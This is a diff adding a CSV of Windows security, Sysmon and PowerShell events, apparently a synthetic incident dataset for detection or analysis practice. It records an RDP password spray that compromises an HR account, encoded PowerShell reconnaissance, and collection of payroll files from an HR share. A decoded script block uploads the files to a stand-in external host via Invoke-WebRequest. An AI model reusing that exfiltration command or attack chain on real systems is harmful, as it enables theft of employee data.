@@ -1,0 +1,78 @@
+ts,host,channel,event_id,user,logon_type,logon_id,src_ip,src_host,status,process,parent,cmdline,dst_ip,dst_port,detail
+2026-09-05T06:00:00Z,HR-WS-009,Security,4624,it.helpdesk,10,0x2000B,10.20.5.25,JUMP-IT-01,,,,,,,CHG-4471
+2026-09-07T04:14:00Z,HR-WS-017,Security,4624,ananya.rao,2,0x1002A,127.0.0.1,HR-WS-017,,,,,,,
+2026-09-08T04:21:00Z,HR-WS-017,Security,4624,ananya.rao,11,0x1003A,127.0.0.1,HR-WS-017,,,,,,,
+2026-09-09T04:03:00Z,HR-WS-017,Security,4624,ananya.rao,2,0x1004A,127.0.0.1,HR-WS-017,,,,,,,
+2026-09-10T04:10:00Z,HR-WS-017,Security,4624,ananya.rao,2,0x1005A,127.0.0.1,HR-WS-017,,,,,,,
+2026-09-11T04:17:00Z,HR-WS-017,Security,4624,ananya.rao,11,0x1006A,127.0.0.1,HR-WS-017,,,,,,,
+2026-09-11T06:17:00Z,HR-WS-009,Security,4624,it.helpdesk,10,0x2006B,10.20.5.25,JUMP-IT-01,,,,,,,CHG-4471
+2026-09-14T04:13:00Z,HR-WS-017,Security,4624,ananya.rao,11,0x1009A,127.0.0.1,HR-WS-017,,,,,,,
+2026-09-15T04:20:00Z,HR-WS-017,Security,4624,ananya.rao,2,0x1010A,127.0.0.1,HR-WS-017,,,,,,,
+2026-09-16T04:02:00Z,HR-WS-017,Security,4624,ananya.rao,2,0x1011A,127.0.0.1,HR-WS-017,,,,,,,
+2026-09-17T04:09:00Z,HR-WS-017,Security,4624,ananya.rao,11,0x1012A,127.0.0.1,HR-WS-017,,,,,,,
+2026-09-17T06:09:00Z,HR-WS-009,Security,4624,it.helpdesk,10,0x2012B,10.20.5.25,JUMP-IT-01,,,,,,,CHG-4471
+2026-09-18T04:16:00Z,HR-WS-017,Security,4624,ananya.rao,2,0x1013A,127.0.0.1,HR-WS-017,,,,,,,
+2026-09-21T04:12:00Z,HR-WS-017,Security,4624,ananya.rao,2,0x1016A,127.0.0.1,HR-WS-017,,,,,,,
+2026-09-22T04:19:00Z,HR-WS-017,Security,4624,ananya.rao,2,0x1017A,127.0.0.1,HR-WS-017,,,,,,,
+2026-09-23T04:01:00Z,HR-WS-017,Security,4624,ananya.rao,11,0x1018A,127.0.0.1,HR-WS-017,,,,,,,
+2026-09-23T06:01:00Z,HR-WS-009,Security,4624,it.helpdesk,10,0x2018B,10.20.5.25,JUMP-IT-01,,,,,,,CHG-4471
+2026-09-24T04:08:00Z,HR-WS-017,Security,4624,ananya.rao,2,0x1019A,127.0.0.1,HR-WS-017,,,,,,,
+2026-09-25T04:15:00Z,HR-WS-017,Security,4624,ananya.rao,2,0x1020A,127.0.0.1,HR-WS-017,,,,,,,
+2026-09-28T04:11:00Z,HR-WS-017,Security,4624,ananya.rao,2,0x1023A,127.0.0.1,HR-WS-017,,,,,,,
+2026-09-29T04:18:00Z,HR-WS-017,Security,4624,ananya.rao,11,0x1024A,127.0.0.1,HR-WS-017,,,,,,,
+2026-09-29T06:18:00Z,HR-WS-009,Security,4624,it.helpdesk,10,0x2024B,10.20.5.25,JUMP-IT-01,,,,,,,CHG-4471
+2026-09-30T04:00:00Z,HR-WS-017,Security,4624,ananya.rao,2,0x1025A,127.0.0.1,HR-WS-017,,,,,,,
+2026-10-01T04:07:00Z,HR-WS-017,Security,4624,ananya.rao,2,0x1026A,127.0.0.1,HR-WS-017,,,,,,,
+2026-10-02T04:14:00Z,HR-WS-017,Security,4624,ananya.rao,11,0x1027A,127.0.0.1,HR-WS-017,,,,,,,
+2026-10-04T21:47:10Z,HR-WS-017,Security,4625,administrator,10,,203.0.113.45,DESKTOP-9KX2TQ,0xC0000064,,,,,,
+2026-10-04T21:47:24Z,HR-WS-017,Security,4625,administrator,10,,203.0.113.45,DESKTOP-9KX2TQ,0xC0000064,,,,,,
+2026-10-04T21:47:38Z,HR-WS-017,Security,4625,administrator,10,,203.0.113.45,DESKTOP-9KX2TQ,0xC0000064,,,,,,
+2026-10-04T21:47:52Z,HR-WS-017,Security,4625,administrator,10,,203.0.113.45,DESKTOP-9KX2TQ,0xC0000064,,,,,,
+2026-10-04T21:48:06Z,HR-WS-017,Security,4625,administrator,10,,203.0.113.45,DESKTOP-9KX2TQ,0xC0000064,,,,,,
+2026-10-04T21:48:20Z,HR-WS-017,Security,4625,administrator,10,,203.0.113.45,DESKTOP-9KX2TQ,0xC0000064,,,,,,
+2026-10-04T21:48:34Z,HR-WS-017,Security,4625,administrator,10,,203.0.113.45,DESKTOP-9KX2TQ,0xC0000064,,,,,,
+2026-10-04T21:48:48Z,HR-WS-017,Security,4625,administrator,10,,203.0.113.45,DESKTOP-9KX2TQ,0xC0000064,,,,,,
+2026-10-04T21:49:02Z,HR-WS-017,Security,4625,hr.admin,10,,203.0.113.45,DESKTOP-9KX2TQ,0xC0000064,,,,,,
+2026-10-04T21:49:16Z,HR-WS-017,Security,4625,hr.admin,10,,203.0.113.45,DESKTOP-9KX2TQ,0xC0000064,,,,,,
+2026-10-04T21:49:30Z,HR-WS-017,Security,4625,hr.admin,10,,203.0.113.45,DESKTOP-9KX2TQ,0xC0000064,,,,,,
+2026-10-04T21:49:44Z,HR-WS-017,Security,4625,hr.admin,10,,203.0.113.45,DESKTOP-9KX2TQ,0xC0000064,,,,,,
+2026-10-04T21:49:58Z,HR-WS-017,Security,4625,hr.admin,10,,203.0.113.45,DESKTOP-9KX2TQ,0xC0000064,,,,,,
+2026-10-04T21:50:12Z,HR-WS-017,Security,4625,hr.admin,10,,203.0.113.45,DESKTOP-9KX2TQ,0xC0000064,,,,,,
+2026-10-04T21:50:26Z,HR-WS-017,Security,4625,ananya.rao,10,,203.0.113.45,DESKTOP-9KX2TQ,0xC000006A,,,,,,
+2026-10-04T21:50:40Z,HR-WS-017,Security,4625,ananya.rao,10,,203.0.113.45,DESKTOP-9KX2TQ,0xC000006A,,,,,,
+2026-10-04T21:50:54Z,HR-WS-017,Security,4625,ananya.rao,10,,203.0.113.45,DESKTOP-9KX2TQ,0xC000006A,,,,,,
+2026-10-04T21:51:08Z,HR-WS-017,Security,4625,ananya.rao,10,,203.0.113.45,DESKTOP-9KX2TQ,0xC000006A,,,,,,
+2026-10-04T21:51:22Z,HR-WS-017,Security,4625,ananya.rao,10,,203.0.113.45,DESKTOP-9KX2TQ,0xC000006A,,,,,,
+2026-10-04T21:51:36Z,HR-WS-017,Security,4625,ananya.rao,10,,203.0.113.45,DESKTOP-9KX2TQ,0xC000006A,,,,,,
+2026-10-04T21:51:50Z,HR-WS-017,Security,4625,ananya.rao,10,,203.0.113.45,DESKTOP-9KX2TQ,0xC000006A,,,,,,
+2026-10-04T21:52:04Z,HR-WS-017,Security,4625,ananya.rao,10,,203.0.113.45,DESKTOP-9KX2TQ,0xC000006A,,,,,,
+2026-10-04T21:52:18Z,HR-WS-017,Security,4625,ananya.rao,10,,203.0.113.45,DESKTOP-9KX2TQ,0xC000006A,,,,,,
+2026-10-04T21:53:02Z,HR-WS-017,Security,4624,ananya.rao,10,0x3E7A21,203.0.113.45,DESKTOP-9KX2TQ,,,,,,,AuthPkg=Negotiate;NLA=yes
+2026-10-04T21:53:02Z,HR-WS-017,Security,4672,ananya.rao,,0x3E7A21,,,,,,,,,SeDebugPrivilege;SeBackupPrivilege;SeTakeOwnershipPrivilege;SeImpersonatePrivilege
+2026-10-04T21:53:11Z,HR-WS-017,Security,4688,ananya.rao,,0x3E7A21,,,,rdpclip.exe,svchost.exe,rdpclip,,,
+2026-10-04T21:54:31Z,HR-WS-017,Security,4688,ananya.rao,,0x3E7A21,,,,cmd.exe,explorer.exe,cmd.exe,,,
+2026-10-04T21:54:40Z,HR-WS-017,Security,4688,ananya.rao,,0x3E7A21,,,,powershell.exe,cmd.exe,powershell.exe -NoP -NonI -W Hidden -Enc JABzAD0AJwBcAFwARgBTAC0ASABSAC0AMAAxAFwASABSACQAJwA...,,,
+2026-10-04T21:54:40Z,HR-WS-017,Sysmon,1,ananya.rao,,0x3E7A21,,,,powershell.exe,cmd.exe,powershell.exe -NoP -NonI -W Hidden -Enc JABzAD0AJwBcAFwARgBTAC0ASABSAC0AMAAxAFwASABSACQAJwA...,,,
+2026-10-04T21:54:41Z,HR-WS-017,PowerShell,4104,ananya.rao,,,,,,powershell.exe,,"whoami /all; nltest /dclist:corp.example.com; net group ""Domain Admins"" /domain; Get-ChildItem \\FS-HR-01\HR$\Payroll -Recurse -Include *.xlsx | Export-Csv C:\Users\Public\p.csv; Invoke-WebRequest -Uri https://cdn-sync.example.net/u -Method Post -InFile C:\Users\Public\p.csv",,,ScriptBlock decoded from -Enc
+2026-10-04T21:54:45Z,HR-WS-017,Sysmon,1,ananya.rao,,0x3E7A21,,,,whoami.exe,powershell.exe,whoami /all,,,
+2026-10-04T21:54:49Z,HR-WS-017,Sysmon,1,ananya.rao,,0x3E7A21,,,,nltest.exe,powershell.exe,nltest /dclist:corp.example.com,,,
+2026-10-04T21:54:53Z,HR-WS-017,Sysmon,1,ananya.rao,,0x3E7A21,,,,net.exe,powershell.exe,"net group ""Domain Admins"" /domain",,,
+2026-10-04T21:55:11Z,HR-WS-017,Sysmon,3,ananya.rao,,,,,,powershell.exe,,,10.20.0.10,389,DC-01 LDAP
+2026-10-04T21:55:36Z,HR-WS-017,Sysmon,3,ananya.rao,,,,,,powershell.exe,,,10.20.30.15,445,FS-HR-01 SMB
+2026-10-04T21:55:41Z,FS-HR-01,Security,4624,ananya.rao,3,0x51C0D2,10.20.40.17,HR-WS-017,,,,,,,
+2026-10-04T21:55:43Z,FS-HR-01,Security,5140,ananya.rao,,,10.20.40.17,,,,,,,,Share=\\*\HR$
+2026-10-04T21:55:45Z,FS-HR-01,Security,5145,ananya.rao,,,10.20.40.17,,,,,,,,HR$\Payroll\Payroll_Q3_2026.xlsx;Access=ReadData
+2026-10-04T21:55:46Z,FS-HR-01,Security,5145,ananya.rao,,,10.20.40.17,,,,,,,,HR$\Payroll\Salary_Revision_FY27.xlsx;Access=ReadData
+2026-10-04T21:55:47Z,FS-HR-01,Security,5145,ananya.rao,,,10.20.40.17,,,,,,,,HR$\Payroll\Bank_Mandates_HR.xlsx;Access=ReadData
+2026-10-04T21:56:01Z,HR-WS-017,Sysmon,3,ananya.rao,,,,,,powershell.exe,,,198.51.100.23,443,cdn-sync.example.net (first seen)
+2026-10-04T22:01:02Z,HR-WS-021,Security,4625,administrator,10,,203.0.113.45,DESKTOP-9KX2TQ,0xC000006A,,,,,,
+2026-10-04T22:01:14Z,HR-WS-021,Security,4625,ananya.rao,10,,203.0.113.45,DESKTOP-9KX2TQ,0xC000006A,,,,,,
+2026-10-04T22:01:26Z,HR-WS-021,Security,4625,administrator,10,,203.0.113.45,DESKTOP-9KX2TQ,0xC000006A,,,,,,
+2026-10-04T22:01:38Z,HR-WS-021,Security,4625,ananya.rao,10,,203.0.113.45,DESKTOP-9KX2TQ,0xC000006A,,,,,,
+2026-10-04T22:01:50Z,HR-WS-021,Security,4625,administrator,10,,203.0.113.45,DESKTOP-9KX2TQ,0xC000006A,,,,,,
+2026-10-04T22:02:02Z,HR-WS-021,Security,4625,ananya.rao,10,,203.0.113.45,DESKTOP-9KX2TQ,0xC000006A,,,,,,
+2026-10-04T22:04:02Z,FIN-WS-004,Security,4625,administrator,10,,203.0.113.45,DESKTOP-9KX2TQ,0xC000006A,,,,,,
+2026-10-04T22:04:14Z,FIN-WS-004,Security,4625,ananya.rao,10,,203.0.113.45,DESKTOP-9KX2TQ,0xC000006A,,,,,,
+2026-10-04T22:04:26Z,FIN-WS-004,Security,4625,administrator,10,,203.0.113.45,DESKTOP-9KX2TQ,0xC000006A,,,,,,
+2026-10-04T22:04:38Z,FIN-WS-004,Security,4625,ananya.rao,10,,203.0.113.45,DESKTOP-9KX2TQ,0xC000006A,,,,,,
+2026-10-04T22:13:02Z,HR-WS-017,Defender,1001,,,,,,,,,,,,Quick scan finished; 0 threats
